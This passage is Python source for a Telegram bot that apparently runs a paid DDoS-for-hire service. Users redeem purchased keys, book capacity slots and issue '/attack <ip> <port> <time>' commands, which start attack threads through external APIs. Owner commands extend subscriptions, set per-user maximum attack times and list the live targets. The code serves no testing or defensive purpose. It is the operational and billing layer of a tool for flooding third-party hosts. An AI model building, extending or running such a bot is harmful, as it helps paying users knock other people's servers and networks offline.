    maintenance_status = "✅ Disabled" if not get_maintenance_mode() else "🔴 Enabled"
    
    uptime_seconds = (datetime.now(IST) - BOT_START_TIME).total_seconds()
    hours = int(uptime_seconds // 3600)
    minutes = int((uptime_seconds % 3600) // 60)
    seconds = int(uptime_seconds % 60)
    uptime_str = f"{hours}h {minutes:02d}m {seconds:02d}s"
    
    response_time = int((datetime.now(IST) - start_time).total_seconds() * 1000)
    
    response = f"🏓 Pong!\n\n"
    response += f"• Response Time: {response_time}ms\n"
    response += f"• Bot Status: 🟢 Online\n"
    response += f"• Users: {total_users}\n"
    response += f"• Maintenance Mode: {maintenance_status}\n"
    response += f"• Uptime: {uptime_str}"
    
    safe_send_message(message.chat.id, response, reply_to=message)
    
@bot.message_handler(commands=["attack"])
def handle_attack(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    if is_owner(user_id):
        print(f"👑 Owner {user_id} - No cooldown! Bypassing...")
    else:
        cooldown = get_user_cooldown(user_id)
        if cooldown > 0:
            fast_cd = get_fast_cooldown_remaining(user_id)
            main_cd = get_main_cooldown_remaining(user_id)
            
            cd_msg = f"⏳ Cooldown Active!\n\n"
            if fast_cd > 0:
                cd_msg += f"⚡ Fast Cooldown: {fast_cd}s (Attack send hone ke baad)\n"
            if main_cd > 0:
                cd_msg += f"🐢 Main Cooldown: {main_cd}s (Attack complete hone ke baad)\n"
            cd_msg += f"\nPlease wait before starting another attack."
            
            safe_send_message(message.chat.id, cd_msg, reply_to=message)
            return
            
    if not is_owner(user_id):
        users_db = get_users()
        user_record = users_db.get(str(user_id))
        
        if user_record and user_record.get('key_start'):
            now_ist = datetime.now(IST)
            start_t = datetime.fromisoformat(user_record['key_start']).astimezone(IST)
            
            if now_ist < start_t:
                start_str = start_t.strftime('%H:%M')
                safe_send_message(
                    message.chat.id, 
                    f"⏳ **PLAN NOT STARTED YET**\n\n"
                    f"Your scheduled key access has not started yet.\n"
                    f"🚀 You can start running attacks at **{start_str}** when your slot opens up!", 
                    reply_to=message
                )
                return

        if not has_valid_key(user_id):
            safe_send_message(message.chat.id, "❌ You don't have a valid key!\n\n🔑 Contact owner or reseller to purchase a key", reply_to=message)
            return
    
    busy_slots, free_slots, total_slots = get_slot_status()
    if free_slots <= 0:
        safe_send_message(message.chat.id, f"❌ All {total_slots} slots are busy!\n\nPlease wait for an attack to finish.\n\n📊 Free: 0/{total_slots}", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 4:
        safe_send_message(message.chat.id, "⚠️ Usage: /attack <ip> <port> <time>\n\nMinimum time: 60 seconds", reply_to=message)
        return
    
    target, port, duration = command_parts[1], command_parts[2], command_parts[3]
    
    if not validate_target(target):
        safe_send_message(message.chat.id, "❌ Invalid IP!", reply_to=message)
        return
    
    if is_ip_blocked(target):
        safe_send_message(message.chat.id, "🚫 This IP is blocked! Use another IP.", reply_to=message)
        return
    
    try:
        port = int(port)
        if port < 1 or port > 65535:
            safe_send_message(message.chat.id, "❌ Invalid port! (1-65535)", reply_to=message)
            return
            
        if is_port_blocked(port):
            safe_send_message(message.chat.id, 
                f"🚫 Port {port} is blocked!\n"
                f"This port cannot be attacked.\n\n"
                f"📋 Blocked ports: {', '.join(map(str, get_blocked_ports()))}", 
                reply_to=message)
            return
            
        duration = int(duration)
        
        if duration < MIN_ATTACK_TIME and not is_owner(user_id):
            safe_send_message(message.chat.id, f"❌ Minimum attack time is {MIN_ATTACK_TIME} seconds!", reply_to=message)
            return
        
        max_time = get_user_max_time(user_id)
        if not is_owner(user_id) and duration > max_time:
            safe_send_message(message.chat.id, f"❌ Max time: {max_time}s", reply_to=message)
            return
        
        selected_api = select_random_api()
        if selected_api is None:
            safe_send_message(message.chat.id, "❌ No API available! Contact owner.", reply_to=message)
            return
        
        if not is_owner(user_id):
            setfastcooldown(user_id)
        
        attack_id = f"{user_id}_{datetime.now(IST).timestamp()}"
        api_index = get_free_api_index()
        
        if api_index is None:
            safe_send_message(message.chat.id, "❌ No free slots available! Please wait.", reply_to=message)
            return
        
        with _attack_lock:
            api_in_use[attack_id] = api_index
            active_attacks[attack_id] = {
                'target': target,
                'port': port,
                'duration': duration,
                'user_id': user_id,
                'start_time': datetime.now(IST),
                'end_time': datetime.now(IST) + timedelta(seconds=duration)
            }
        
        thread = threading.Thread(target=start_attack, args=(target, port, duration, message, attack_id, api_index, selected_api))
        thread.start()
        
    except ValueError:
        safe_send_message(message.chat.id, "❌ Port and time must be numbers!", reply_to=message)
        
@bot.message_handler(commands=["status"])
def status_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id

    if not has_valid_key(user_id) and not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ You don't have a valid key!\n🔑 Contact owner or reseller to purchase a key", reply_to=message)
        return

    response = build_status_message(user_id)
    sent_msg = safe_send_message(message.chat.id, response, reply_to=message)
    
    if sent_msg and (user_has_active_attack(user_id) or get_user_cooldown(user_id) > 0):
        threading.Thread(target=auto_update_status, args=(sent_msg.chat.id, sent_msg.message_id, user_id), daemon=True).start()

@bot.message_handler(commands=["redeemlimit"])
def set_redeem_limit(message):
    if not is_owner(message.from_user.id): return
    try:
        new_limit = int(message.text.split()[1])
        set_setting('global_redeem_limit', new_limit) 
        bot.reply_to(message, f"✅ **SUCCESS**\nBot Capacity Limit set to: `{new_limit}`", parse_mode="Markdown")
    except:
        bot.reply_to(message, "⚠️ Usage: `/redeemlimit 5`", parse_mode="Markdown")
        
@bot.message_handler(commands=["redeemstatus"])
def check_redeem_capacity(message):
    if check_maintenance(message): return
    
    all_bookings = load_json(SLOTS_FILE, {})
    current_limit = get_setting('global_redeem_limit', 4) 
    
    now_ist = datetime.now(IST)
    start_dt = now_ist.replace(minute=0, second=0, microsecond=0)
    if now_ist.minute >= 30:
        start_dt = start_dt.replace(minute=30)
    
    response = "📊 **𝘽𝙊𝙏 𝘾𝘼𝙋𝘼𝘾𝙄𝙏𝙔 𝙎𝙏𝘼𝙏𝙐𝙎 (30𝙢)**\n"
    response += "━━━━━━━━━━━━━━━━━━━━\n"
    response += f"⚙️ 𝙈𝙖𝙭 𝙇𝙞𝙢𝙞𝙩: `{current_limit} Users`\n\n"
    
    for i in range(48):
        check_dt = start_dt + timedelta(minutes=i * 30)
        check_date = check_dt.strftime("%Y-%m-%d")
        check_hour = check_dt.strftime("%H:%M")
        
        active_count = 0
        for b_id, info in all_bookings.items():
            if info.get('date') == check_date:
                if info.get('start') == check_hour:
                    active_count += 1
        
        status_icon = "🔴 FULL" if active_count >= current_limit else "🟢 OPEN"
        response += f"🕒 {check_hour} ➜ {status_icon} ({active_count}/{current_limit})\n"
        
        if len(response) > 3500:
            bot.reply_to(message, response, parse_mode="Markdown")
            response = ""

    if response:
        response += "\n━━━━━━━━━━━━━━━━━━━━\n"
        response += "💡 *Check this before redeeming your active keys.*"
        bot.reply_to(message, response, parse_mode="Markdown")

def find_next_available_slot(duration_blocks, current_limit, start_from_dt):
    all_bookings = load_json(SLOTS_FILE, {})
    
    start_dt = start_from_dt.replace(minute=0, second=0, microsecond=0)
    if start_from_dt.minute >= 30:
        start_dt = start_dt.replace(minute=30)
    
    for offset in range(96):
        check_start = start_dt + timedelta(minutes=offset * 30)
        is_possible = True
        
        for i in range(duration_blocks):
            target_hour = check_start + timedelta(minutes=i * 30)
            target_date_str = target_hour.strftime("%Y-%m-%d")
            target_hour_str = target_hour.strftime("%H:%M")
            
            active_count = 0
            for b_id, info in all_bookings.items():
                if info.get('date') == target_date_str and info.get('start') == target_hour_str:
                    active_count += 1
            
            if active_count >= current_limit:
                is_possible = False
                break
        
        if is_possible:
            return check_start
    return None

@bot.message_handler(commands=['clearslots'])
def clear_paid_slots(message):
    if is_owner(message.from_user.id):
        save_json(SLOTS_FILE, {})
        bot.reply_to(message, 
            "✅ **MASTER CAPACITY RESET**\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "🟢 All wait-times have been cleared.\n"
            "📊 /redeemstatus is now 100% OPEN.", 
            parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ **Owner only command.**")
        
@bot.message_handler(commands=["redeem"])
def redeem_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /redeem <key>")
        return
    
    key_input = command_parts[1]
    keys = get_keys()
    key_doc = keys.get(key_input)
    
    if not key_doc or key_doc.get('used'):
        bot.reply_to(message, "❌ Invalid or already used key!")
        return

    try:
        duration_sec = key_doc['duration_seconds']
        current_limit = get_setting('global_redeem_limit', 2)
        
        now_ist = datetime.now(IST)
        
        users = get_users()
        user_data = users.get(str(user_id))
        
        if user_data and user_data.get('key_expiry'):
            try:
                expiry_dt = datetime.fromisoformat(user_data['key_expiry'])
                if expiry_dt.tzinfo is None:
                    expiry_dt = IST.localize(expiry_dt)
                
                if expiry_dt > now_ist:
                    formatted_expiry = expiry_dt.strftime('%Y-%m-%d %H:%M')
                    bot.reply_to(
                        message, 
                        f"❌ **REDEEM BLOCK**\n\n"
                        f"You already have an active plan running!\n"
                        f"⏳ **Your plan expires on:** `{formatted_expiry}`\n\n"
                        f"⚠️ You cannot redeem another key until your current subscription completely ends.",
                        parse_mode="Markdown"
                    )
                    return 
            except Exception as e:
                logging.error(f"Error validating active key block: {e}")

        has_active = False
        current_expiry = now_ist

        base_blocks = max(1, duration_sec // 1800)
        available_dt = find_next_available_slot(base_blocks + 1, current_limit, current_expiry)

        current_hour_aligned = now_ist.replace(minute=0, second=0, microsecond=0)
        if now_ist.minute >= 30:
            current_hour_aligned = current_hour_aligned.replace(minute=30)

        if available_dt <= current_hour_aligned + timedelta(minutes=1):
            blocks_to_block = base_blocks + 1
            is_buffered = True
        else:
            blocks_to_block = base_blocks
            is_buffered = False

        if available_dt > current_expiry + timedelta(minutes=1):
            wait_time = available_dt.strftime("%H:%M")
            wait_date = available_dt.strftime("%Y-%m-%d")
            
            tx_id = f"{user_id}_{int(datetime.now(IST).timestamp())}"
            pending_redemptions[tx_id] = {
                "key": key_input,
                "available_dt": available_dt.isoformat(),
                "blocks": blocks_to_block,
                "duration_sec": duration_sec,
                "has_active": has_active,
                "current_expiry": current_expiry.isoformat(),
                "is_buffered": is_buffered
            }
            
            markup = InlineKeyboardMarkup()
            markup.add(
                InlineKeyboardButton(f"✅ Yes, Redeem at {wait_time}", callback_data=f"cf_rdm|{tx_id}"),
                InlineKeyboardButton("❌ Cancel", callback_data=f"cn_rdm|{tx_id}")
            )
            
            prompt_text = (
                f"⚠️ **CURRENT SLOT IS FULL**\n\n"
                f"The bot is at max concurrent capacity right now.\n"
                f"👉 Do you want to redeem this key at **{wait_time}** ({wait_date}) because that slot is completely free?"
            )
            bot.reply_to(message, prompt_text, reply_markup=markup, parse_mode="Markdown")
            return

        all_bookings = load_json(SLOTS_FILE, {})
        for i in range(blocks_to_block):
            target_dt = available_dt + timedelta(minutes=i * 30)
            booking_id = f"PAID_{user_id}_{target_dt.strftime('%Y%m%d_%H%M')}_{random.randint(100,999)}"
            all_bookings[booking_id] = {
                "user_id": str(user_id),
                "start": target_dt.strftime("%H:%M"),
                "date": target_dt.strftime("%Y-%m-%d")
            }
        save_json(SLOTS_FILE, all_bookings)

        if has_active:
            new_expiry_time = current_expiry + timedelta(seconds=duration_sec)
            key_start_time = now_ist
            label = f"Extended {key_doc['duration_label']}"
        else:
            if is_buffered:
                key_start_time = now_ist
                new_expiry_time = available_dt + timedelta(minutes=blocks_to_block * 30)
            else:
                key_start_time = available_dt
                new_expiry_time = available_dt + timedelta(seconds=duration_sec)
            label = key_doc['duration_label']
        
        users[str(user_id)] = {
            'user_id': user_id,
            'username': message.from_user.first_name,
            'key_start': key_start_time.isoformat(), 
            'key_expiry': new_expiry_time.isoformat(),
            'key_duration_label': label,
            'redeemed_key': key_input
        }
        save_users(users)

        key_doc.update({'used': True, 'used_by': user_id, 'used_at': now_ist.isoformat()})
        save_keys(keys)
        
        bot.reply_to(message, f"✅ **KEY REDEEMED SUCCESSFULLY!**\n\n🕒 **Plan Active From:** `{available_dt.strftime('%H:%M')}`\n⏳ **Plan Expiry Time:** `{new_expiry_time.strftime('%Y-%m-%d %H:%M')}`", parse_mode="Markdown")

    except Exception as e:
        logging.error(f"Redeem System Error: {e}")
        bot.reply_to(message, "❌ Error processing redemption.")


@bot.message_handler(commands=["extendall"])
def handle_extend_all_keys(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ **Usage:** `/extendall <duration>`\n*Example:* `/extendall 1h` or `/extendall 30m`", parse_mode="Markdown")
        return

    duration_str = command_parts[1].lower()
    
    match = re.match(r'^(\d+)([mhqd])$', duration_str)
    if not match:
        delta, label = parse_duration(duration_str)
        if not delta:
            safe_send_message(message.chat.id, "❌ **Invalid format!** Use values like `30m`, `2h`, or `1d`.", parse_mode="Markdown")
            return
    else:
        value = int(match.group(1))
        unit = match.group(2)
        if unit == 'm': delta = timedelta(minutes=value)
        elif unit == 'h': delta = timedelta(hours=value)
        elif unit == 'd': delta = timedelta(days=value)
        else: delta = timedelta(seconds=0)

    users = get_users()
    all_bookings = load_json(SLOTS_FILE, {})
    
    now_ist = datetime.now(IST)
    
    updated_users_count = 0
    slots_added_count = 0

    for uid, user_data in users.items():
        key_expiry_str = user_data.get('key_expiry')
        key_start_str = user_data.get('key_start')
        if not key_expiry_str:
            continue

        try:
            expiry_dt = datetime.fromisoformat(key_expiry_str)
            if expiry_dt.tzinfo is None:
                expiry_dt = IST.localize(expiry_dt)

            if key_start_str:
                start_dt = datetime.fromisoformat(key_start_str)
                if start_dt.tzinfo is None:
                    start_dt = IST.localize(start_dt)
            else:
                start_dt = now_ist

            if start_dt <= now_ist < expiry_dt:
                new_expiry_dt = expiry_dt + delta
                user_data['key_expiry'] = new_expiry_dt.isoformat()
                updated_users_count += 1

                added_seconds = int(delta.total_seconds())
                blocks_to_append = max(1, added_seconds // 1800)

                for i in range(blocks_to_append):
                    target_dt = expiry_dt + timedelta(minutes=i * 30)
                    booking_id = f"PAID_{uid}_{target_dt.strftime('%Y%m%d_%H%M')}_{random.randint(100,999)}"
                    all_bookings[booking_id] = {
                        "user_id": str(uid),
                        "start": target_dt.strftime("%H:%M"),
                        "date": target_dt.strftime("%Y-%m-%d")
                    }
                    slots_added_count += 1
                
                try:
                    bot.send_message(int(uid), f"🎉 **Good News!** The administrator has extended your running subscription plan by **{duration_str.upper()}**.\n New Expiry Time: `{new_expiry_dt.strftime('%Y-%m-%d %H:%M')}`", parse_mode="Markdown")
                except:
                    pass  

        except Exception as file_err:
            logging.error(f"Failed parsing ledger line during bulk update for User ID {uid}: {file_err}")
            continue

    if updated_users_count > 0:
        save_users(users)
        save_json(SLOTS_FILE, all_bookings)
        
        success_summary = (
            f"✅ **ACTIVE EXTENSION COMPLETE**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👥 **Updated Active Accounts:** `{updated_users_count}` users\n"
            f"➕ **Added Time:** `{duration_str.upper()}`\n"
            f"🛡️ **Capacity Blocks Booked:** `{slots_added_count}` slot intervals\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 Upcoming future keys were skipped and left untouched."
        )
        safe_send_message(message.chat.id, success_summary, parse_mode="Markdown")
    else:
        safe_send_message(message.chat.id, "📋 **No currently running active keys found to extend.**", parse_mode="Markdown")

@bot.message_handler(commands=["extend"])
def handle_extend_single_user(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return

    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ **Usage:** `/extend <user_id> <duration>`\n*Example:* `/extend 123456789 1h` or `/extend 123456789 30m`", parse_mode="Markdown")
        return

    target_id_str = command_parts[1].strip()
    duration_str = command_parts[2].lower()
    
    match = re.match(r'^(\d+)([mhqd])$', duration_str)
    if not match:
        delta, label = parse_duration(duration_str)
        if not delta:
            safe_send_message(message.chat.id, "❌ **Invalid format!** Use values like `30m`, `2h`, or `1d`.", parse_mode="Markdown")
            return
    else:
        value = int(match.group(1))
        unit = match.group(2)
        if unit == 'm': delta = timedelta(minutes=value)
        elif unit == 'h': delta = timedelta(hours=value)
        elif unit == 'd': delta = timedelta(days=value)
        else: delta = timedelta(seconds=0)

    users = get_users()
    
    if target_id_str not in users:
        safe_send_message(message.chat.id, f"❌ **Error:** User ID `{target_id_str}` was not found in the active database.", parse_mode="Markdown")
        return

    user_data = users[target_id_str]
    key_expiry_str = user_data.get('key_expiry')
    
    if not key_expiry_str:
        safe_send_message(message.chat.id, f"❌ **Error:** User `{target_id_str}` has no active key data to extend.", parse_mode="Markdown")
        return

    try:
        now_ist = datetime.now(IST)
        
        expiry_dt = datetime.fromisoformat(key_expiry_str)
        if expiry_dt.tzinfo is None:
            expiry_dt = IST.localize(expiry_dt)

        new_expiry_dt = expiry_dt + delta
        user_data['key_expiry'] = new_expiry_dt.isoformat()
        
        save_users(users)

        all_bookings = load_json(SLOTS_FILE, {})
        added_seconds = int(delta.total_seconds())
        blocks_to_append = max(1, added_seconds // 1800)
        slots_added_count = 0

        for i in range(blocks_to_append):
            target_dt = expiry_dt + timedelta(minutes=i * 30)
            booking_id = f"PAID_{target_id_str}_{target_dt.strftime('%Y%m%d_%H%M')}_{random.randint(100,999)}"
            all_bookings[booking_id] = {
                "user_id": str(target_id_str),
                "start": target_dt.strftime("%H:%M"),
                "date": target_dt.strftime("%Y-%m-%d")
            }
            slots_added_count += 1
            
        save_json(SLOTS_FILE, all_bookings)
        
        raw_name = user_data.get('username', 'Unknown')
        username = str(raw_name).replace('_', ' ').replace('*', '').replace('`', '')

        success_summary = (
            f"✅ **USER EXTENSION COMPLETE**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 **User:** {username} (`{target_id_str}`)\n"
            f"➕ **Added Time:** `{duration_str.upper()}`\n"
            f"📅 **New Expiry:** `{new_expiry_dt.strftime('%Y-%m-%d %H:%M')}`\n"
            f"🛡️ **Capacity Slots Added:** `{slots_added_count}` intervals\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        safe_send_message(message.chat.id, success_summary, parse_mode="Markdown")
        
        try:
            bot.send_message(int(target_id_str), f"🎉 **Good News!** Your subscription plan has been extended by **{duration_str.upper()}** by the administrator.\nNew Expiry Time: `{new_expiry_dt.strftime('%Y-%m-%d %H:%M')}`", parse_mode="Markdown")
        except:
            pass  

    except Exception as e:
        logging.error(f"Error handling single user extension for {target_id_str}: {e}")
        safe_send_message(message.chat.id, "❌ **Critical system error occurred while updating timestamps.**", parse_mode="Markdown")
        
        
@bot.message_handler(commands=["allattacks"])
def allattacks_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only command!", reply_to=message)
        return
    
    with _attack_lock:
        now = datetime.now(IST)
        
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            if k in active_attacks:
                del active_attacks[k]
        
        if not active_attacks:
            safe_send_message(message.chat.id, "📋 No active attacks right now!", reply_to=message)
            return
        
        response = "╔════════════════════════════════════════════╗\n"
        response += "║        ⚔️ ALL ACTIVE ATTACKS ⚔️           ║\n"
        response += "╚════════════════════════════════════════════╝\n\n"
        
        for i, (attack_id, attack) in enumerate(active_attacks.items(), 1):
            remaining = int((attack['end_time'] - datetime.now(IST)).total_seconds())
            total = attack['duration']
            elapsed = total - remaining
            progress = int((elapsed / total) * 100)
            
            attacker_id = attack.get('user_id')
            try:
                chat = bot.get_chat(attacker_id)
                if chat.username:
                    username = f"@{chat.username}"
                elif chat.first_name:
                    username = chat.first_name
                else:
                    username = str(attacker_id)
            except:
                username = str(attacker_id)
            
            bar_length = 15
            filled = int(bar_length * progress / 100)
            bar = '🟢' * filled + '⚫' * (bar_length - filled)
            
            response += f"┌────────────────────────────────────────┐\n"
            response += f"│ 👤 #{i} {username}\n"
            response += f"│ 🆔 ID: `{attacker_id}`\n"
            response += f"│ 🎯 Target: `{attack['target']}:{attack['port']}`\n"
            response += f"│ ⏱️ Time Left: `{remaining}s` / {total}s\n"
            response += f"│ 📊 Progress: [{bar}] {progress}%\n"
            response += f"└────────────────────────────────────────┘\n\n"
        
        response += f"📊 **Total Active Attacks:** {len(active_attacks)}"
        
        safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["setmaxtime"])
def set_user_max_time_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only command!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, 
            "⚠️ Usage: /setmaxtime <user_id> <seconds>\n\n"
            "Example: /setmaxtime 123456789 240\n"
            "Max limit: 240 seconds\n"
            "Use 0 to remove custom limit\n\n"
            "💡 User doesn't need to be in database!", 
            reply_to=message)
        return
    
    try:
        target_id = int(command_parts[1])
        seconds = int(command_parts[2])
        
        if seconds < 60 and seconds != 0:
            safe_send_message(message.chat.id, "❌ Minimum time is 60 seconds!", reply_to=message)
            return
        
        if seconds > 240:
            safe_send_message(message.chat.id, "❌ Maximum time is 240 seconds!", reply_to=message)
            return
        
        if seconds == 0:
            if remove_user_max_time(target_id):
                safe_send_message(message.chat.id, f"✅ Removed custom limit for user `{target_id}`!\nNow using global limit: {get_max_attack_time()}s", reply_to=message, parse_mode="Markdown")
            else:
                safe_send_message(message.chat.id, f"❌ User `{target_id}` has no custom limit!", reply_to=message, parse_mode="Markdown")
        else:
            set_user_max_time(target_id, seconds)
            safe_send_message(message.chat.id, f"✅ User `{target_id}` can now attack up to `{seconds}s`!\n(Global limit: {get_max_attack_time()}s)\n\n💡 User can now attack without being in database!", reply_to=message, parse_mode="Markdown")
            
            try:
                bot.send_message(target_id, f"🎉 Owner has increased your attack limit!\n\n⚡ New Max Attack Time: `{seconds}s`\n💎 Enjoy!")
            except:
                pass
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid user ID! Use numeric ID only.\nExample: `/setmaxtime 123456789 240`", reply_to=message)
    except Exception as e:
        safe_send_message(message.chat.id, f"❌ Error: {e}", reply_to=message)

@bot.message_handler(commands=["checkmaxtime"])
def check_user_max_time_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only command!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /checkmaxtime <user_id>", reply_to=message)
        return
    
    try:
        target_id = int(command_parts[1])
        user_max = get_user_max_time(target_id)
        global_max = get_max_attack_time()
        
        try:
            chat = bot.get_chat(target_id)
            username = chat.first_name or str(target_id)
        except:
            username = str(target_id)
        
        response = f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        response += f"👤𝗨𝗦𝗘𝗥:{username}\n"
        response += f"🆔𝗜𝗗:{target_id}\n"
        response += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        response += f"⚡𝗨𝗦𝗘𝗥 𝗠𝗔𝗫 𝗧𝗜𝗠𝗘: {user_max}s\n"
        response += f"🌍𝗚𝗟𝗢𝗕𝗔𝗟 𝗠𝗔𝗫 𝗧𝗜𝗠𝗘:{global_max}s\n"
        
        if target_id in [int(k) for k in user_max_time.keys()]:
            response += f"\n✅ User has **CUSTOM** limit!\n"
        else:
            response += f"\n📌 User using **GLOBAL** limit.\n"
        
        safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")
    except:
        safe_send_message(message.chat.id, "❌ Invalid user ID!", reply_to=message)

@bot.message_handler(commands=["allmaxtime"])
def all_users_max_time_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only command!", reply_to=message)
        return
    
    if not user_max_time:
        safe_send_message(message.chat.id, "📋 No users have custom max time set!", reply_to=message)
        return
    
    response = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    response += "📊 𝗨𝗦𝗘𝗥𝗦 𝗪𝗜𝗧𝗛 𝗖𝗨𝗦𝗧𝗢𝗠 𝗠𝗔𝗫 𝗧𝗜𝗠𝗘\n"
    response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    for uid, max_t in user_max_time.items():
        try:
            chat = bot.get_chat(int(uid))
            username = chat.first_name or uid
        except:
            username = uid
        response += f"👤 {username} (`{uid}`) → `{max_t}s`\n"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["attacklist"])
def attacklist_command(message):
    user_id = message.from_user.id
    
    if not is_whitelisted_for_attacklist(user_id):
        safe_send_message(message.chat.id, "❌ You do not have permission to use this command!", reply_to=message)
        return
    
    with _attack_lock:
        now = datetime.now(IST)
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            if k in active_attacks:
                del active_attacks[k]
        
        if not active_attacks:
            safe_send_message(message.chat.id, "📋 No active attacks!", reply_to=message)
            return
        
        response = "⚔️ **ACTIVE ATTACKS LIST**\n\n"
        
        for i, (attack_id, attack) in enumerate(active_attacks.items(), 1):
            remaining = int((attack['end_time'] - datetime.now(IST)).total_seconds())
            attacker_id = attack.get('user_id')
            
            try:
                chat = bot.get_chat(attacker_id)
                if chat.username:
                    raw_username = f"@{chat.username}"
                else:
                    raw_username = chat.first_name or str(attacker_id)
            except:
                raw_username = str(attacker_id)
            
            username = raw_username.replace('_', ' ').replace('*', '').replace('`', '').replace('[', '').replace(']', '')
            
            response += f"{i}. {username} (`{attacker_id}`) ➜ `{attack['target']}:{attack['port']}` - {remaining}s left\n"
        
        safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["userstatus"])
def userstatus_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /userstatus <user_id>\n\nExample: /userstatus 123456789", reply_to=message)
        return
    
    try:
        target_id = int(parts[1])
        
        is_attacking = False
        attack_info = None
        
        for attack_id, attack in active_attacks.items():
            if attack.get('user_id') == target_id:
                is_attacking = True
                remaining = int((attack['end_time'] - datetime.now(IST)).total_seconds())
                attack_info = {
                    'target': attack['target'],
                    'port': attack['port'],
                    'remaining': remaining,
                    'total': attack['duration']
                }
                break
        
        fast_cd = get_fast_cooldown_remaining(target_id)
        main_cd = get_main_cooldown_remaining(target_id)
        
        try:
            chat = bot.get_chat(target_id)
            if chat.username:
                username = f"@{chat.username}"
            elif chat.first_name:
                username = chat.first_name
            else:
                username = str(target_id)
        except:
            username = str(target_id)
        
        response = f"""
╔════════════════════════════════════════╗
║           👤 USER STATUS              ║
╚════════════════════════════════════════╝

📛 **Username:** {username}
🆔 **User ID:** `{target_id}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        
        if is_attacking:
            elapsed = attack_info['total'] - attack_info['remaining']
            progress = int((elapsed / attack_info['total']) * 100)
            bar_length = 20
            filled = int(bar_length * progress / 100)
            bar = '█' * filled + '░' * (bar_length - filled)
            
            response += f"""
⚔️ **CURRENT ATTACK:**

🎯 **Target:** `{attack_info['target']}:{attack_info['port']}`
⏱️ **Time Remaining:** `{attack_info['remaining']}s` / {attack_info['total']}s
📊 **Progress:** `{bar}` {progress}%

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        else:
            response += f"""
⚔️ **CURRENT ATTACK:**

💤 **No active attack**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        
        response += f"""
⏱️ **COOLDOWN STATUS:**

⚡ **Fast Cooldown:** `{fast_cd}s`
🐢 **Main Cooldown:** `{main_cd}s`

{'✅ **Ready to attack!**' if fast_cd == 0 and main_cd == 0 and not is_attacking else '⏳ **Please wait...**'}

╚════════════════════════════════════════╝
"""
        safe_send_message(message.chat.id, response, parse_mode="Markdown")
        
    except:
        safe_send_message(message.chat.id, "❌ Invalid user ID!", reply_to=message)

@bot.message_handler(commands=["allusersstatus"])
def allusersstatus_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    users = get_users()
    if not users:
        safe_send_message(message.chat.id, "📋 No users found!", reply_to=message)
        return
    
    response = "╔════════════════════════════════════════════╗\n"
    response += "║        👥 ALL USERS STATUS              ║\n"
    response += "╚════════════════════════════════════════════╝\n\n"
    
    attacking_users = []
    idle_users = []
    
    for uid, user_data in users.items():
        uid_int = int(uid)
        
        is_attacking = False
        for attack_id, attack in active_attacks.items():
            if attack.get('user_id') == uid_int:
                is_attacking = True
                break
        
        try:
            chat = bot.get_chat(uid_int)
            if chat.username:
                username = f"@{chat.username}"
            else:
                username = chat.first_name or str(uid_int)
        except:
            username = str(uid_int)
        
        if is_attacking:
            attacking_users.append((uid_int, username))
        else:
            idle_users.append((uid_int, username))
    
    response += f"🔴 **ATTACKING ({len(attacking_users)}):**\n"
    for uid, name in attacking_users:
        response += f"   • {name} (`{uid}`)\n"
    
    response += f"\n🟢 **IDLE ({len(idle_users)}):**\n"
    for uid, name in idle_users[:20]:
        response += f"   • {name} (`{uid}`)\n"
    
    if len(idle_users) > 20:
        response += f"   • ... and {len(idle_users) - 20} more\n"
    
    response += f"\n📊 **Total Users:** {len(users)}"
    
